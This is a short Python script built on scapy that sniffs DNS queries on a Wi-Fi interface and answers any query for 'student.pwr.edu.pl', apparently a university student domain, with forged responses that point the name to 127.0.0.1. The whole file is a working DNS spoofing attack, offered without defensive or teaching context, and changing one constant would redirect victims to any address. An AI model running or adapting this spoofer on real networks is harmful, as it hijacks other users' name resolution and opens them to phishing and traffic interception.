from scapy.all import DNS
from scapy.all import DNSQR
from scapy.all import DNSRR
from scapy.all import IP
from scapy.all import send
from scapy.all import sniff
from scapy.all import UDP

IFACE = "Wi-Fi"
DNS_SERVER_IP = "127.0.0.1"
BPF_FILTER = f"udp port 53"


def get_response(pkt):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
        if "student.pwr.edu.pl" in str(pkt["DNS Question Record"].qname):
            spf_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) /\
                       UDP(dport=pkt[UDP].sport, sport=53) / \
                       DNS(id=pkt[DNS].id, ancount=1, qr=1,
                           an=DNSRR(rrname=pkt[DNSQR].qname, rdata=DNS_SERVER_IP, type=pkt[DNSQR].qtype) /
                              DNSRR(rrname="student.pwr.edu.pl", rdata=DNS_SERVER_IP))

            send(spf_resp, iface=IFACE)
            return f"Spoofed DNS Response Sent: {pkt[IP].src}"


sniff(filter=BPF_FILTER, prn=get_response, iface=IFACE)
